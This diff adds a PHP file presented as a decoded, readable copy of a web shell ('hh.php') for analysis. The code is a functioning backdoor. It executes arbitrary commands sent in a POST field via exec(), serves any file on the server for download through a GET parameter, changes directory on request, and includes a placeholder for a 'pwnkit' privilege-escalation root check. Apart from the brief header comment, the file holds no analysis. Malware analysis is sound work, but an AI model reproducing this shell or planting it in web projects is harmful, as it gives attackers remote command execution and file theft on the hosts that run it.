@@ -1,0 +1,51 @@
+<?php
+/**
+ * Decoded / readable version of the logic in hh.php.
+ * This is a cleaned-up representation for analysis and review.
+ */
+
+if (isset($_GET["d"])) {
+    chdir($_GET["d"]);
+}
+
+if (isset($_GET["don"])) {
+    download($_GET["don"]);
+}
+
+if (isset($_POST["terminal"])) {
+    echo cmd($_POST["terminal-text"] . " 2>&1");
+}
+
+if (isset($_GET["terminal"]) && $_GET["terminal"] === "root") {
+    if (file_exists(".mad-root") && file_exists("pwnkit")) {
+        // Root-check / privilege escalation attempt placeholder.
+        // Original script checks whether a known local privilege escalation
+        // condition exists on the host before trying to run code as root.
+    }
+}
+
+function download($file)
+{
+    if (file_exists($file)) {
+        header("Content-Description: File Transfer");
+        header("Content-Type: application/octet-stream");
+        header("Content-Disposition: attachment; filename=" . basename($file));
+        header("Content-Transfer-Encoding: binary");
+        header("Expires: 0");
+        header("Cache-Control: must-revalidate");
+        header("Pragma: public");
+        header("Content-Length: " . filesize($file));
+        ob_clean();
+        flush();
+        readfile($file);
+        exit;
+    }
+}
+
+function cmd($command)
+{
+    $output = [];
+    $status = 0;
+    exec($command, $output, $status);
+    return implode("\n", $output);
+}
